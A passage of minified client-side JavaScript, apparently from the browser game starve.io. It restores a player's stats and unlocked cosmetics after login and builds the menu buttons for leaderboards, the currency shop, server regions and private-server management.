        t.update_score(r.score);
        n_.score = r.score;
        n_.kill = r.kill;
        n_.death = r.death;
        n_.time = r.time;
        n_.bestScore = r.bestScore;
        n_.bestKill = r.bestKill;
        n_.bestTime = r.bestTime;
        n_.scoreTotal = r.scoreTotal;
        n_.firstName = e.firstName;
        document.getElementById("serverAddressInput").value = "https://starve.io/?server=" + e.privateServer;
        if (n_.firstName === undefined) {
          n_.firstName = 0;
        }
        n_.privateServerTime = Date.now() + e.privateServerTime;
        if (Number(e.privateServerTime) > 0) {
          n_.privateServerTime = Date.now() + Number(e.privateServerTime);
        }
        n_.kit = Date.now() + e.kit;
        if (Number(e.kit) > 0) {
          n_.kit = Date.now() + Number(e.kit);
        }
        for (var a = COSMETICS.SKIN, o = 0; o < e.skins.length; o++) {
          if (e.skins[o] > 0) {
            for (var s = 0; s < a.length; s++) {
              if (a[s].id === o) {
                t.unlock.skin[s] = 1;
              }
            }
          }
        }
        a = COSMETICS.ACCESSORY;
        o = 0;
        for (; o < e.accessories.length; o++) {
          if (e.accessories[o] > 0) {
            for (s = 0; s < a.length; s++) {
              if (a[s].id === o) {
                t.unlock.accessory[s] = 1;
              }
            }
          }
        }
        a = COSMETICS.BOOK;
        o = 0;
        for (; o < e.books.length; o++) {
          if (e.books[o] > 0) {
            for (s = 0; s < a.length; s++) {
              if (a[s].id === o) {
                t.unlock.book[s] = 1;
              }
            }
          }
        }
        a = COSMETICS.BAG;
        o = 0;
        for (; o < e.bags.length; o++) {
          if (e.bags[o] > 0) {
            for (s = 0; s < a.length; s++) {
              if (a[s].id === o) {
                t.unlock.bag[s] = 1;
              }
            }
          }
        }
        a = COSMETICS.CRATE;
        o = 0;
        for (; o < e.crates.length; o++) {
          if (e.crates[o] > 0) {
            for (s = 0; s < a.length; s++) {
              if (a[s].id === o) {
                t.unlock.crate[s] = 1;
                t.unlock.dead[s] = 1;
              }
            }
          }
        }
      };
      this.login_after = function () {
        window.onUserLogin = function () {
          F(d);
          (function (e) {
            var i = new XMLHttpRequest();
            i.open("GET", O_ + "login?token=" + C_ + "&type=" + g_);
            i.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            i.onreadystatechange = function () {
              if (this.readyState === 4 && this.status === 200 && i.responseText !== "0") {
                e(JSON.parse(i.responseText));
              }
            };
            i.send();
          })(t.login_restore_data);
        };
        if (b_ === 1) {
          window.onUserLogin();
        }
      };
      window.onUserLogout = function () {
        n_.buttons[n_.LOGIN_BUTTON].info.active = 1;
        n_.buttons[n_.PROFILE_BUTTON].info.active = 0;
        n_.buttons[n_.PROFILE_BUTTON_2].info.active = 0;
        F(d);
      };
      this.isUserLogged = function () {
        return n_.buttons[n_.PROFILE_BUTTON].info.active;
      };
      this.buttons[A] = rs(461, 105, 0, [IMAGES.GET_MORE_BUTTON_OUT, IMAGES.GET_MORE_BUTTON_IN, IMAGES.GET_MORE_BUTTON_CLICK], 1, 0, function () {
        if (t.isUserLogged()) {
          F(R);
        } else {
          F(I);
        }
      }, -100, 80, Z | q, $);
      this.buttons[A++].view = l;
      this.buttons[A] = rs(157, 158, 0, [IMAGES.TUTO_WIKI_OUT, IMAGES.TUTO_WIKI_IN, IMAGES.TUTO_WIKI_CLICK], 1, 0, function () {
        window.open("https://starveiopro.wikia.com/wiki/", "_blank");
      }, -35, 125, Z | q, $);
      this.buttons[A++].view = O;
      this.buttons[A] = rs(66, 73, 0, [IMAGES.TUTO_PREVIOUS_OUT, IMAGES.TUTO_PREVIOUS_IN, IMAGES.TUTO_PREVIOUS_CLICK], 1, 0, undefined, -68, 340, Z | q, $);
      this.buttons[A++].view = O;
      this.buttons[A] = rs(66, 73, 0, [IMAGES.TUTO_NEXT_OUT, IMAGES.TUTO_NEXT_IN, IMAGES.TUTO_NEXT_CLICK], 1, 0, undefined, -30, 340, Z | q, $);
      this.buttons[A++].view = O;
      this.buttons[A] = rs(97, 66, 0, [IMAGES.LVL_LEADERBOARD_OUT, IMAGES.LVL_LEADERBOARD_IN, IMAGES.LVL_LEADERBOARD_CLICK], 1, 0, undefined, -14, 151, Z | q, $);
      this.buttons[A++].view = c;
      this.LEADERBOARD_KILL = A;
      this.buttons[A] = rs(135, 66, 0, [IMAGES.KILL_LEADERBOARD_OUT, IMAGES.KILL_LEADERBOARD_IN, IMAGES.KILL_LEADERBOARD_CLICK], 1, 0, function () {
        W_(undefined, undefined, n_.LEADERBOARD_KILL);
      }, 37.5, 151, Z | q, $);
      this.buttons[A++].view = c;
      this.LEADERBOARD_TIME = A;
      this.buttons[A] = rs(160, 66, 0, [IMAGES.TIME_LEADERBOARD_OUT, IMAGES.TIME_LEADERBOARD_IN, IMAGES.TIME_LEADERBOARD_CLICK], 1, 0, function () {
        W_(undefined, undefined, n_.LEADERBOARD_TIME);
      }, 107.5, 151, Z | q, $);
      this.buttons[A++].view = c;
      this.LEADERBOARD_SCORE = A;
      this.buttons[A] = rs(207, 66, 0, [IMAGES.SCORE_LEADERBOARD_OUT, IMAGES.SCORE_LEADERBOARD_IN, IMAGES.SCORE_LEADERBOARD_CLICK], 1, 0, function () {
        W_(undefined, undefined, n_.LEADERBOARD_SCORE);
      }, 190.5, 151, Z | q, $);
      this.buttons[A++].view = c;
      this.LEADERBOARD_TODAY = A;
      this.buttons[A] = rs(144, 66, 0, [IMAGES.TODAY_LEADERBOARD_OUT, IMAGES.TODAY_LEADERBOARD_IN, IMAGES.TODAY_LEADERBOARD_CLICK], 1, 0, function () {
        W_(n_.LEADERBOARD_TODAY);
      }, 103.5, 110, Z | q, $);
      this.buttons[A++].view = c;
      this.LEADERBOARD_WEEK = A;
      this.buttons[A] = rs(124, 66, 0, [IMAGES.WEEK_LEADERBOARD_OUT, IMAGES.WEEK_LEADERBOARD_IN, IMAGES.WEEK_LEADERBOARD_CLICK], 1, 0, function () {
        W_(n_.LEADERBOARD_WEEK);
      }, 177.5, 110, Z | q, $);
      this.buttons[A++].view = c;
      this.LEADERBOARD_ALL = A;
      this.buttons[A] = rs(104, 66, 0, [IMAGES.ALL_LEADERBOARD_OUT, IMAGES.ALL_LEADERBOARD_IN, IMAGES.ALL_LEADERBOARD_CLICK], 1, 0, function () {
        W_(n_.LEADERBOARD_ALL);
      }, 242, 110, Z | q, $);
      this.buttons[A++].view = c;
      this.LEADERBOARD_SEASON1 = A;
      this.buttons[A] = rs(183, 66, 0, [IMAGES.SEASON1_LEADERBOARD_OUT, IMAGES.SEASON1_LEADERBOARD_IN, IMAGES.SEASON1_LEADERBOARD_CLICK], 1, 0, function () {
        W_(undefined, undefined, undefined, n_.LEADERBOARD_SEASON1);
      }, -290, 521, Z | q, $);
      this.buttons[A++].view = c;
      this.LEADERBOARD_SEASON2 = A;
      this.buttons[A] = rs(183, 66, 0, [IMAGES.SEASON2_LEADERBOARD_OUT, IMAGES.SEASON2_LEADERBOARD_IN, IMAGES.SEASON2_LEADERBOARD_CLICK], 1, 0, function () {
        W_(undefined, undefined, undefined, n_.LEADERBOARD_SEASON2);
      }, -185, 521, Z | q, $);
      this.buttons[A++].view = c;
      this.LEADERBOARD_SEASON3 = A;
      this.buttons[A] = rs(183, 66, 0, [IMAGES.SEASON3_LEADERBOARD_OUT, IMAGES.SEASON3_LEADERBOARD_IN, IMAGES.SEASON3_LEADERBOARD_CLICK], 1, 0, function () {
        W_(undefined, undefined, undefined, n_.LEADERBOARD_SEASON3);
      }, -80, 521, Z | q, $);
      this.buttons[A++].view = c;
      this.LEADERBOARD_SEASON4 = A;
      this.buttons[A] = rs(183, 66, 0, [IMAGES.SEASON4_LEADERBOARD_OUT, IMAGES.SEASON4_LEADERBOARD_IN, IMAGES.SEASON4_LEADERBOARD_CLICK], 1, 0, function () {
        W_(undefined, undefined, undefined, n_.LEADERBOARD_SEASON4);
      }, 25, 521, Z | q, $);
      this.buttons[A++].view = c;
      this.LEADERBOARD_SEASON5 = A;
      this.buttons[A] = rs(183, 66, 0, [IMAGES.SEASON5_LEADERBOARD_OUT, IMAGES.SEASON5_LEADERBOARD_IN, IMAGES.SEASON5_LEADERBOARD_CLICK], 1, 0, function () {
        W_(undefined, undefined, undefined, n_.LEADERBOARD_SEASON5);
      }, 130, 521, Z | q, $);
      this.buttons[A++].view = c;
      this.buttons[A] = rs(232, 352, 0, [IMAGES.CURRENCY1_OUT, IMAGES.CURRENCY1_IN, IMAGES.CURRENCY1_CLICK], 1, 0, function () {
        f_(300);
      }, -330, 135, Z | q, $);
      this.buttons[A++].view = R;
      this.buttons[A] = rs(232, 352, 0, [IMAGES.CURRENCY2_OUT, IMAGES.CURRENCY2_IN, IMAGES.CURRENCY2_CLICK], 1, 0, function () {
        f_(600);
      }, -195, 135, Z | q, $);
      this.buttons[A++].view = R;
      this.buttons[A] = rs(243, 374, 0, [IMAGES.CURRENCY3_OUT, IMAGES.CURRENCY3_IN, IMAGES.CURRENCY3_CLICK], 1, 0, function () {
        f_(2600);
      }, -60, 130, Z | q, $);
      this.buttons[A++].view = R;
      this.buttons[A] = rs(232, 352, 0, [IMAGES.CURRENCY4_OUT, IMAGES.CURRENCY4_IN, IMAGES.CURRENCY4_CLICK], 1, 0, function () {
        f_(7000);
      }, 78, 135, Z | q, $);
      this.buttons[A++].view = R;
      this.buttons[A] = rs(243, 374, 0, [IMAGES.CURRENCY5_OUT, IMAGES.CURRENCY5_IN, IMAGES.CURRENCY5_CLICK], 1, 0, function () {
        f_(20000);
      }, 213, 130, Z | q, $);
      this.buttons[A++].view = R;
      this.buttons[A] = rs(58, 64, 0, [IMAGES.CLOSE_BUTTON_OUT, IMAGES.CLOSE_BUTTON_IN, IMAGES.CLOSE_BUTTON_CLICK], 1, 0, function () {
        F(l);
      }, 300, 88, Z | q, $);
      this.buttons[A++].view = R;
      this.buttons[A] = rs(323, 112, 0, [IMAGES.SKIN_BUTTON_OUT, IMAGES.SKIN_BUTTON_IN, IMAGES.SKIN_BUTTON_CLICK], 1, 0, function () {
        F(f);
        Se.initSelector();
      }, -315, 185, Z | q, $);
      this.buttons[A++].view = u;
      this.buttons[A] = rs(323, 112, 0, [IMAGES.ACCESSORY_BUTTON_OUT, IMAGES.ACCESSORY_BUTTON_IN, IMAGES.ACCESSORY_BUTTON_CLICK], 1, 0, function () {
        F(B);
        Le.initSelector();
      }, -315, 321, Z | q, $);
      this.buttons[A++].view = u;
      this.buttons[A] = rs(323, 112, 0, [IMAGES.BAG_BUTTON_OUT, IMAGES.BAG_BUTTON_IN, IMAGES.BAG_BUTTON_CLICK], 1, 0, function () {
        F(P);
        pe.initSelector();
      }, 153, 185, Z | q, $);
      this.buttons[A++].view = u;
      this.buttons[A] = rs(323, 112, 0, [IMAGES.BOOK_BUTTON_OUT, IMAGES.BOOK_BUTTON_IN, IMAGES.BOOK_BUTTON_CLICK], 1, 0, function () {
        F(y);
        me.initSelector();
      }, 153, 321, Z | q, $);
      this.buttons[A++].view = u;
      this.buttons[A] = rs(323, 112, 0, [IMAGES.CRATE_BUTTON_OUT, IMAGES.CRATE_BUTTON_IN, IMAGES.CRATE_BUTTON_CLICK], 1, 0, function () {
        F(H);
        ve.initSelector();
      }, 153, 463, Z | q, $);
      this.buttons[A++].view = u;
      this.buttons[A] = rs(323, 112, 0, [IMAGES.LOOT_BUTTON_OUT, IMAGES.LOOT_BUTTON_IN, IMAGES.LOOT_BUTTON_CLICK], 1, 0, function () {
        F(z);
        Me.initSelector();
      }, -315, 463, Z | q, $);
      this.buttons[A++].view = u;
      this.buttons[A] = rs(130, 129, 0, [IMAGES.SHOP_BUTTON_OUT, IMAGES.SHOP_BUTTON_IN, IMAGES.SHOP_BUTTON_CLICK], 1, 0, function () {
        Y(g, $, "none");
        F(l);
      }, 10, 40, Z | q, $);
      this.buttons[A++].view = g;
      this.buttons[A] = rs(130, 129, 0, [IMAGES.SHOP_BUTTON_OUT, IMAGES.SHOP_BUTTON_IN, IMAGES.SHOP_BUTTON_CLICK], 1, 0, function () {
        Y(C, $, "none");
        F(l);
      }, 10, 40, Z | q, $);
      this.buttons[A++].view = C;
      this.buttons[A] = rs(115, 73, 0, [IMAGES.BACK_BUTTON_OUT, IMAGES.BACK_BUTTON_IN, IMAGES.BACK_BUTTON_CLICK], 1, 0, function () {
        F(l);
      }, 200, 140, Z | q, $);
      this.buttons[A++].view = w;
      this.buttons[A] = rs(253, 110, 0, [IMAGES.ATLANTA_OUT, IMAGES.ATLANTA_IN, IMAGES.ATLANTA_CLICK], 1, 0, function () {
        H_("Atlanta");
      }, -265, 300, Z | q, $);
      this.buttons[A++].view = w;
      this.buttons[A] = rs(253, 110, 0, [IMAGES.DALLAS_OUT, IMAGES.DALLAS_IN, IMAGES.DALLAS_CLICK], 1, 0, function () {
        H_("Dallas");
      }, -130, 300, Z | q, $);
      this.buttons[A++].view = w;
      this.buttons[A] = rs(253, 110, 0, [IMAGES.FREMONT_OUT, IMAGES.FREMONT_IN, IMAGES.FREMONT_CLICK], 1, 0, function () {
        H_("Fremont");
      }, 5, 300, Z | q, $);
      this.buttons[A++].view = w;
      this.buttons[A] = rs(253, 110, 0, [IMAGES.NEWARK_OUT, IMAGES.NEWARK_IN, IMAGES.NEWARK_CLICK], 1, 0, function () {
        H_("Newark");
      }, 140, 300, Z | q, $);
      this.buttons[A++].view = w;
      this.buttons[A] = rs(253, 110, 0, [IMAGES.LONDON_OUT, IMAGES.LONDON_IN, IMAGES.LONDON_CLICK], 1, 0, function () {
        H_("London");
      }, -265, 365, Z | q, $);
      this.buttons[A++].view = w;
      this.buttons[A] = rs(253, 110, 0, [IMAGES.FRANKFURT_OUT, IMAGES.FRANKFURT_IN, IMAGES.FRANKFURT_CLICK], 1, 0, function () {
        H_("Frankfurt");
      }, -130, 365, Z | q, $);
      this.buttons[A++].view = w;
      this.buttons[A] = rs(253, 110, 0, [IMAGES.SINGAPORE_OUT, IMAGES.SINGAPORE_IN, IMAGES.SINGAPORE_CLICK], 1, 0, function () {
        H_("Singapore");
      }, 5, 365, Z | q, $);
      this.buttons[A++].view = w;
      this.buttons[A] = rs(253, 110, 0, [IMAGES.TOKYO_OUT, IMAGES.TOKYO_IN, IMAGES.TOKYO_CLICK], 1, 0, function () {
        H_("Tokyo");
      }, 140, 365, Z | q, $);
      this.buttons[A++].view = w;
      this.buttons[A] = rs(253, 110, 0, [IMAGES.TORONTO_OUT, IMAGES.TORONTO_IN, IMAGES.TORONTO_CLICK], 1, 0, function () {
        H_("Toronto");
      }, -265, 430, Z | q, $);
      this.buttons[A++].view = w;
      this.buttons[A] = rs(253, 110, 0, [IMAGES.MUMBAI_OUT, IMAGES.MUMBAI_IN, IMAGES.MUMBAI_CLICK], 1, 0, function () {
        H_("Mumbai");
      }, -130, 430, Z | q, $);
      this.buttons[A++].view = w;
      this.buttons[A] = rs(115, 73, 0, [IMAGES.BACK_BUTTON_OUT, IMAGES.BACK_BUTTON_IN, IMAGES.BACK_BUTTON_CLICK], 1, 0, function () {
        F(w);
      }, 230, 140, Z | q, $);
      this.buttons[A++].view = K;
      this.buttons[A] = rs(230, 352, 0, [IMAGES.DAYS3_OUT, IMAGES.DAYS3_IN, IMAGES.DAYS3_CLICK], 1, 0, function () {
        f_(350);
      }, -280, 240, Z | q, $);
      this.buttons[A++].view = K;
      this.buttons[A] = rs(230, 352, 0, [IMAGES.DAYS7_OUT, IMAGES.DAYS7_IN, IMAGES.DAYS7_CLICK], 1, 0, function () {
        f_(700);
      }, -130, 240, Z | q, $);
      this.buttons[A++].view = K;
      this.buttons[A] = rs(230, 352, 0, [IMAGES.DAYS30_OUT, IMAGES.DAYS30_IN, IMAGES.DAYS30_CLICK], 1, 0, function () {
        f_(1400);
      }, 20, 240, Z | q, $);
      this.buttons[A++].view = K;
      this.buttons[A] = rs(230, 352, 0, [IMAGES.DAYS90_OUT, IMAGES.DAYS90_IN, IMAGES.DAYS90_CLICK], 1, 0, function () {
        f_(3000);
      }, 170, 240, Z | q, $);
      this.buttons[A++].view = K;
      this.buttons[A] = rs(105, 119, 0, [IMAGES.COPY_PASTE_OUT, IMAGES.COPY_PASTE_IN, IMAGES.COPY_PASTE_CLICK], 1, 0, function () {
        document.getElementById("serverAddressInput").select();
        document.execCommand("copy");
      }, 170, 310, Z | q, $);
      this.buttons[A++].view = U;
      this.buttons[A] = rs(105, 119, 0, [IMAGES.RESTART_OUT, IMAGES.RESTART_IN, IMAGES.RESTART_CLICK], 1, 0, function () {
        !function () {
          var e = new XMLHttpRequest();
          e.open("GET", O_ + "rebootServer?token=" + C_ + "&userid=" + N_);
          e.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
          e.onreadystatechange = function () {
            if (this.readyState === 4 && this.status === 200 && e.responseText !== "0") {
              location.href = document.getElementById("serverAddressInput").value;
            }
          };
          e.send();
        }();
      }, 235, 310, Z | q, $);
      this.buttons[A++].view = U;
      this.buttons[A] = rs(204, 115, 0, [IMAGES.GUIDE_OUT, IMAGES.GUIDE_IN, IMAGES.GUIDE_CLICK], 1, 0, function () {
        window.open("./commands.html", "_blank");
      }, -265, 490, Z | q, $);
      this.buttons[A++].view = U;
      this.buttons[A] = rs(145, 69, 0, [IMAGES.PRICE5_OUT, IMAGES.PRICE5_IN, IMAGES.PRICE5_CLICK], 1, 0, function () {
        F(N);
      }, -210, 170, Z | q, $);
      this.buttons[A++].view = l;
      this.buttons[A] = rs(145, 69, 0, [IMAGES.PRICE1_OUT, IMAGES.PRICE1_IN, IMAGES.PRICE1_CLICK], 1, 0, function () {
        F(M);
      }, 70, 170, Z | q, $);
      this.buttons[A++].view = l;
      this.buttons[A] = rs(145, 69, 0, [IMAGES.PRICE2_OUT, IMAGES.PRICE2_IN, IMAGES.PRICE2_CLICK], 1, 0, function () {
        F(b);
      }, 70, 204, Z | q, $);
      this.buttons[A++].view = l;
      this.buttons[A] = rs(145, 69, 0, [IMAGES.PRICE3_OUT, IMAGES.PRICE3_IN, IMAGES.PRICE3_CLICK], 1, 0, function () {
        F(L);
      }, -210, 204, Z | q, $);
      this.buttons[A++].view = l;
      this.buttons[A] = rs(145, 69, 0, [IMAGES.PRICE3_OUT, IMAGES.PRICE3_IN, IMAGES.PRICE3_CLICK], 1, 0, function () {
        F(G);
      }, 70, 238, Z | q, $);
      this.buttons[A++].view = l;
      this.buttons[A] = rs(145, 69, 0, [IMAGES.PRICE3_OUT, IMAGES.PRICE3_IN, IMAGES.PRICE3_CLICK], 1, 0, function () {
        if (t.isUserLogged()) {
          B_(0, 300);
        } else {
          F(I);
        }
      }, 307, 205, Z | q, $);
      this.buttons[A++].view = l;
      this.buttons[A] = rs(145, 69, 0, [IMAGES.PRICE4_OUT, IMAGES.PRICE4_IN, IMAGES.PRICE4_CLICK], 1, 0, function () {
        F(D);
      }, -210, 238, Z | q, $);
      this.buttons[A++].view = l;
      this.buttons[A] = rs(145, 69, 0, [IMAGES.PRICE4_OUT, IMAGES.PRICE4_IN, IMAGES.PRICE4_CLICK], 1, 0, function () {
        if (t.isUserLogged()) {
          B_(1, 600);
        } else {
          F(I);
        }
      }, 307, 239, Z | q, $);
      this.buttons[A++].view = l;
      this.buttons[A] = rs(192, 101, 0, [IMAGES.YES_BUTTON_OUT, IMAGES.YES_BUTTON_IN, IMAGES.YES_BUTTON_CLICK], 1, 0, function () {
        y_();
      }, -100, 250, Z | q, $);
      this.buttons[A++].view = V;
      this.buttons[A] = rs(192, 104, 0, [IMAGES.YES_300_BUTTON_OUT, IMAGES.YES_300_BUTTON_IN, IMAGES.YES_300_BUTTON_CLICK], 1, 0, function () {
        y_();
      }, -100, 239, Z | q, $);
      this.buttons[A++].view = W;
      this.buttons[A] = rs(192, 101, 0, [IMAGES.NO_BUTTON_OUT, IMAGES.NO_BUTTON_IN, IMAGES.NO_BUTTON_CLICK], 1, 0, function () {
        F(h);
      }, 10, 250, Z | q, $);
      this.buttons[A++].view = V;
      this.buttons[A] = rs(192, 104, 0, [IMAGES.NO_THANKS_BUTTON_OUT, IMAGES.NO_THANKS_BUTTON_IN, IMAGES.NO_THANKS_BUTTON_CLICK], 1, 0, function () {
        F(h);
      }, 10, 239, Z | q, $);
      this.buttons[A++].view = W;
      RARITY_BUTTON = [];
      RARITY_BUTTON[RARITY.FREE] = [IMAGES.FREE_ITEM_OUT, IMAGES.FREE_ITEM_IN, IMAGES.FREE_ITEM_CLICK];
      RARITY_BUTTON[RARITY.WOOD] = [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK];
      RARITY_BUTTON[RARITY.STONE] = [IMAGES.STONE_ITEM_OUT, IMAGES.STONE_ITEM_IN, IMAGES.STONE_ITEM_CLICK];
      RARITY_BUTTON[RARITY.GOLD] = [IMAGES.GOLD_ITEM_OUT, IMAGES.GOLD_ITEM_IN, IMAGES.GOLD_ITEM_CLICK];
      RARITY_BUTTON[RARITY.DIAMOND] = [IMAGES.DIAMOND_ITEM_OUT, IMAGES.DIAMOND_ITEM_IN, IMAGES.DIAMOND_ITEM_CLICK];
      RARITY_BUTTON[RARITY.AMETHYST] = [IMAGES.AMETHYST_ITEM_OUT, IMAGES.AMETHYST_ITEM_IN, IMAGES.AMETHYST_ITEM_CLICK];
      RARITY_BUTTON[RARITY.REIDITE] = [IMAGES.REIDITE_ITEM_OUT, IMAGES.REIDITE_ITEM_IN, IMAGES.REIDITE_ITEM_CLICK];
      RARITY_BUTTON[RARITY.LEVEL] = [IMAGES.LEVEL_ITEM_OUT, IMAGES.LEVEL_ITEM_IN, IMAGES.LEVEL_ITEM_CLICK];
      RARITY_BUTTON[RARITY.SPECIAL] = [IMAGES.SPECIAL_ITEM_OUT, IMAGES.SPECIAL_ITEM_IN, IMAGES.SPECIAL_ITEM_CLICK];
      FIRST_BUTTON_SKIN = A;
      this.buttons[A] = rs(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, undefined, -29, 205, Z | q, $);
      this.buttons[A++].view = f;
      this.buttons[A] = rs(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, undefined, -29, 300, Z | q, $);
      this.buttons[A++].view = f;
      this.buttons[A] = rs(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, undefined, -29, 395, Z | q, $);
      this.buttons[A++].view = f;
      this.buttons[A] = rs(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, undefined, 65, 205, Z | q, $);
      this.buttons[A++].view = f;
      this.buttons[A] = rs(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, undefined, 65, 300, Z | q, $);
      this.buttons[A++].view = f;
      this.buttons[A] = rs(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, undefined, 65, 395, Z | q, $);
      this.buttons[A++].view = f;
      this.buttons[A] = rs(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, undefined, 159, 205, Z | q, $);
      this.buttons[A++].view = f;
      this.buttons[A] = rs(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, undefined, 159, 300, Z | q, $);
      this.buttons[A++].view = f;
      this.buttons[A] = rs(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, undefined, 159, 395, Z | q, $);
      this.buttons[A++].view = f;
      this.buttons[A] = rs(39, 122, 0, [IMAGES.SKIN_PREVIOUS_OUT, IMAGES.SKIN_PREVIOUS_IN, IMAGES.SKIN_PREVIOUS_CLICK], 1, 0, undefined, -61, 315, Z | q, $);
      this.buttons[A++].view = f;
      this.buttons[A] = rs(39, 122, 0, [IMAGES.SKIN_NEXT_OUT, IMAGES.SKIN_NEXT_IN, IMAGES.SKIN_NEXT_CLICK], 1, 0, undefined, 260, 315, Z | q, $);
      this.buttons[A++].view = f;
      this.buttons[A] = rs(115, 73, 0, [IMAGES.BACK_BUTTON_OUT, IMAGES.BACK_BUTTON_IN, IMAGES.BACK_BUTTON_CLICK], 1, 0, function () {
        F(u);
      }, -320, 470, Z | q, $);
      this.buttons[A++].view = f;
      FIRST_BUTTON_ACCESSORY = A;
      this.buttons[A] = rs(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, undefined, -29, 205, Z | q, $);
      this.buttons[A++].view = B;
      this.buttons[A] = rs(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, undefined, -29, 300, Z | q, $);
      this.buttons[A++].view = B;
      this.buttons[A] = rs(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, undefined, -29, 395, Z | q, $);
      this.buttons[A++].view = B;
      this.buttons[A] = rs(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, undefined, 65, 205, Z | q, $);
      this.buttons[A++].view = B;
      this.buttons[A] = rs(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, undefined, 65, 300, Z | q, $);
      this.buttons[A++].view = B;
      this.buttons[A] = rs(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, undefined, 65, 395, Z | q, $);
      this.buttons[A++].view = B;
      this.buttons[A] = rs(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, undefined, 159, 205, Z | q, $);
      this.buttons[A++].view = B;
      this.buttons[A] = rs(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, undefined, 159, 300, Z | q, $);
      this.buttons[A++].view = B;
      this.buttons[A] = rs(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, undefined, 159, 395, Z | q, $);
      this.buttons[A++].view = B;
      this.buttons[A] = rs(39, 122, 0, [IMAGES.SKIN_PREVIOUS_OUT, IMAGES.SKIN_PREVIOUS_IN, IMAGES.SKIN_PREVIOUS_CLICK], 1, 0, undefined, -61, 315, Z | q, $);
      this.buttons[A++].view = B;
      this.buttons[A] = rs(39, 122, 0, [IMAGES.SKIN_NEXT_OUT, IMAGES.SKIN_NEXT_IN, IMAGES.SKIN_NEXT_CLICK], 1, 0, undefined, 260, 315, Z | q, $);
      this.buttons[A++].view = B;
      this.buttons[A] = rs(115, 73, 0, [IMAGES.BACK_BUTTON_OUT, IMAGES.BACK_BUTTON_IN, IMAGES.BACK_BUTTON_CLICK], 1, 0, function () {
        F(u);
      }, -320, 470, Z | q, $);
      this.buttons[A++].view = B;
      FIRST_BUTTON_LOOT = A;
      this.buttons[A] = rs(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, undefined, -29, 205, Z | q, $);
      this.buttons[A++].view = z;
      this.buttons[A] = rs(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, undefined, -29, 300, Z | q, $);
      this.buttons[A++].view = z;
      this.buttons[A] = rs(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, undefined, -29, 395, Z | q, $);
      this.buttons[A++].view = z;
      this.buttons[A] = rs(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, undefined, 65, 205, Z | q, $);
      this.buttons[A++].view = z;
      this.buttons[A] = rs(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, undefined, 65, 300, Z | q, $);
      this.buttons[A++].view = z;
      this.buttons[A] = rs(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, undefined, 65, 395, Z | q, $);
      this.buttons[A++].view = z;
      this.buttons[A] = rs(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, undefined, 159, 205, Z | q, $);
      this.buttons[A++].view = z;
      this.buttons[A] = rs(178, 182, 0, [IMAGES.WOOD_ITEM_OUT, IMAGES.WOOD_ITEM_IN, IMAGES.WOOD_ITEM_CLICK], 1, 0, undefined, 159, 300, Z | q, $);
      this.buttons[A++].view = z;
